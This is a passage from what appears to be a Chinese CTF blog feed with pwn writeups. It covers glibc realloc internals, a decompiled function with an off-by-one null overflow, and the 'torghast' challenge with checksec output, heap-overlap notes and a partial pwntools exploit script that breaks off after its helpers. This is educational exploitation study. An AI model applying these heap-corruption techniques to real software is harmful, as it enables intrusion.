函数，但是 realloc 内在内部调用 malloc。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> *__libc_realloc (<span class=\"type\">void</span> *oldmem, <span class=\"type\">size_t</span> bytes)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mstate ar_ptr;</span><br><span class=\"line\">  INTERNAL_SIZE_T nb;         <span class=\"comment\">/* padded request size */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">void</span> *newp;             <span class=\"comment\">/* chunk to return */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">void</span> *(*hook) (<span class=\"type\">void</span> *, <span class=\"type\">size_t</span>, <span class=\"type\">const</span> <span class=\"type\">void</span> *) =</span><br><span class=\"line\">    atomic_forced_read (__realloc_hook);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__builtin_expect (hook != <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class=\"number\">0</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (bytes == <span class=\"number\">0</span> &amp;&amp; oldmem != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      __libc_free (oldmem); <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* realloc of null is supposed to be same as malloc */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (oldmem == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __libc_malloc (bytes);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* chunk corresponding to oldmem */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> mchunkptr oldp = mem2chunk (oldmem);</span><br><span class=\"line\">  <span class=\"comment\">/* its size */</span></span><br><span class=\"line\">  <span class=\"type\">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (chunk_is_mmapped (oldp))</span><br><span class=\"line\">    ar_ptr = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      MAYBE_INIT_TCACHE ();</span><br><span class=\"line\">      ar_ptr = arena_for_chunk (oldp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Little security check which won&#x27;t hurt performance: the allocator</span></span><br><span class=\"line\"><span class=\"comment\">     never wrapps around at the end of the address space.  Therefore</span></span><br><span class=\"line\"><span class=\"comment\">     we can exclude some size values which might appear here by</span></span><br><span class=\"line\"><span class=\"comment\">     accident or by &quot;design&quot; from some intruder.  We need to bypass</span></span><br><span class=\"line\"><span class=\"comment\">     this check for dumped fake mmap chunks from the old main arena</span></span><br><span class=\"line\"><span class=\"comment\">     because the new malloc may provide additional alignment.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((__builtin_expect ((<span class=\"type\">uintptr_t</span>) oldp &gt; (<span class=\"type\">uintptr_t</span>) -oldsize, <span class=\"number\">0</span>)</span><br><span class=\"line\">       || __builtin_expect (misaligned_chunk (oldp), <span class=\"number\">0</span>))</span><br><span class=\"line\">      &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (oldp))</span><br><span class=\"line\">      malloc_printerr (<span class=\"string\">&quot;realloc(): invalid pointer&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  checked_request2size (bytes, nb);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (chunk_is_mmapped (oldp))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* If this is a faked mmapped chunk from the dumped main arena,</span></span><br><span class=\"line\"><span class=\"comment\">\t always make a copy (and do not free the old chunk).  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (DUMPED_MAIN_ARENA_CHUNK (oldp))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Must alloc, copy, free. */</span></span><br><span class=\"line\">\t  <span class=\"type\">void</span> *newmem = __libc_malloc (bytes);</span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (newmem == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t  <span class=\"comment\">/* Copy as many bytes as are available from the old chunk</span></span><br><span class=\"line\"><span class=\"comment\">\t     and fit into the new size.  NB: The overhead for faked</span></span><br><span class=\"line\"><span class=\"comment\">\t     mmapped chunks is only SIZE_SZ, not 2 * SIZE_SZ as for</span></span><br><span class=\"line\"><span class=\"comment\">\t     regular mmapped chunks.  */</span></span><br><span class=\"line\">\t  <span class=\"keyword\">if</span> (bytes &gt; oldsize - SIZE_SZ)</span><br><span class=\"line\">\t    bytes = oldsize - SIZE_SZ;</span><br><span class=\"line\">\t  <span class=\"built_in\">memcpy</span> (newmem, oldmem, bytes);</span><br><span class=\"line\">\t  <span class=\"keyword\">return</span> newmem;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"type\">void</span> *newmem;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> HAVE_MREMAP</span></span><br><span class=\"line\">      newp = mremap_chunk (oldp, nb);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newp)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chunk2mem (newp);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">      <span class=\"comment\">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> oldmem;                         <span class=\"comment\">/* do nothing */</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Must alloc, copy, free. */</span></span><br><span class=\"line\">      newmem = __libc_malloc (bytes);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newmem == <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;              <span class=\"comment\">/* propagate failure */</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"built_in\">memcpy</span> (newmem, oldmem, oldsize - <span class=\"number\">2</span> * SIZE_SZ);</span><br><span class=\"line\">      munmap_chunk (oldp);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> newmem;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (SINGLE_THREAD_P)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class=\"line\">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class=\"line\">\t      ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">return</span> newp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class=\"line\"></span><br><span class=\"line\">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class=\"line\"></span><br><span class=\"line\">  __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class=\"line\">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class=\"line\">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (newp == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class=\"line\">      LIBC_PROBE (memory_realloc_retry, <span class=\"number\">2</span>, bytes, oldmem);</span><br><span class=\"line\">      newp = __libc_malloc (bytes);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (newp != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class=\"line\">          _int_free (ar_ptr, oldp, <span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> newp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__libc_realloc)</span><br></pre></td></tr></table></figure>\n<p>大致意思就是如果 realloc (NULL,size) 就会调用 malloc。</p>\n<p>realloc (ptr,0)，调用 free。程序也是用这里实现的 free</p>\n<p>realloc (ptr,chunksize (ptr)), 不做任何事情。</p>\n<p>如果申请一个更大的空间，会检查当前堆块的附近是否有足够的空间，没有，则重新申请，然后将数据 copy 过去，并 free 原来的 chunk</p>\n<p>申小空间会将多余的空间释放掉。</p>\n<p>程序只允许我们存储两个 chunk 再 heap [2], 并且限制了我们的申请大小位 0x78。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">allocate</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 size; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index:&quot;</span>);</span><br><span class=\"line\">  v2 = read_long();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &gt; <span class=\"number\">1</span> || heap[v2] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size:&quot;</span>);</span><br><span class=\"line\">    size = read_long();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x78</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v4 = <span class=\"built_in\">realloc</span>(<span class=\"number\">0LL</span>, size);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        heap[v2] = v4;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data:&quot;</span>);</span><br><span class=\"line\">        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)size));\t\t<span class=\"comment\">//一字节溢出</span></span><br><span class=\"line\">        *v0 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;alloc error&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Too large!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>allocate 函数里存在 off_by_one 的 null 溢出。</p>\n<p>程序并没有输出的功能。</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/05/10/torghast/",
            "url": "http://example.com/2022/05/10/torghast/",
            "title": "torghast",
            "date_published": "2022-05-10T10:29:08.000Z",
            "content_html": "<h1 id=\"202205-春秋杯-pwn-torghast\"><a class=\"markdownIt-Anchor\" href=\"#202205-春秋杯-pwn-torghast\">#</a> 202205 春秋杯 pwn torghast</h1>\n<h2 id=\"环境及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境及保护\">#</a> 环境及保护</h2>\n<p>2.31 的堆题目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ checksec --file=pwn</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols\t  No\t0\t\t2\t\tpwn</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ strings libc-2.31.so | grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/chunqiubei/pwn/torghast$ </span><br></pre></td></tr></table></figure>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>我们要想正常做堆题，就必须获得 GM 权限，通过 use magic，造成整数溢出（将 mp 弄成负数），然后闯关，获得 GM 权限</p>\n<p>题目存在空字符的 off-by-one, 但是因为是高版本的 glibc，就导致了修改 chunksize 最低位，触发 unlink 向前合并失效</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* consolidate backward */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">      prevsize = prev_size (p);</span><br><span class=\"line\">      size += prevsize;</span><br><span class=\"line\">      p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class=\"line\">        malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class=\"line\">      unlink_chunk (av, p);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>这里检查了前 chunk 的 size 与我们释放堆块的 prev_size 是否相等，我 i 们想利用堆块合并构造 overlap 就无效了。一般来说绕过方式是在 chunk 内部伪造一个 chunk, 但是前提是我们可以知道堆地址。</p>\n<p>首先物品们通过 unsortedbins 泄露出 libc 以及 chunksize，就可以后面继续 overlap 了</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/home/dreamcat/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getGM</span>():</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;GM&quot;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Welcome&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;get the GM permission!!!&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Menu&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">selectuser</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;User?&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manage</span>():</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">back</span>():</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,size,text</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Id&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> size&gt;=<span class=\"number\">1000</span>:</span><br><span class=\"line\">        r.sendafter(<span class=\"string\">&quot;Size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;Size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&quot;Data&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Change&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.sendafter(<span class=\"string\">&quot;Log&quot;</span>,text)   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">&quot;lete&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    